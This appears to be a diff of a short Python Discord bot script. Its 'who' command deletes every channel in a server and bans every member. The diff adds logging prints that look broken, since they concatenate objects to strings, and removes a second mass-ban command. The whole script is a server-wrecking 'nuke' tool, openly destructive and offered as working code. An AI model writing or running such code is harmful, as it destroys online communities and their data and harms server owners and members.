@@ -9,20 +9,12 @@ bot = Bot(intents=intents, command_prefix='')
 async def who(ctx):
     for c in ctx.guild.channels:
         await c.delete()
+        print(c + "has been deleted")
     for member in list(ctx.guild.members):
       try:
         await member.ban(reason='banall')
+        print(member + "has been banned")
       except:
         pass
-
-@bot.command()
-async def ru(ctx):
-    for member in list(ctx.guild.members):
-      try:
-        await member.ban(reason='banall')
-      except:
-        pass
-    
-
 
 bot.run("token")
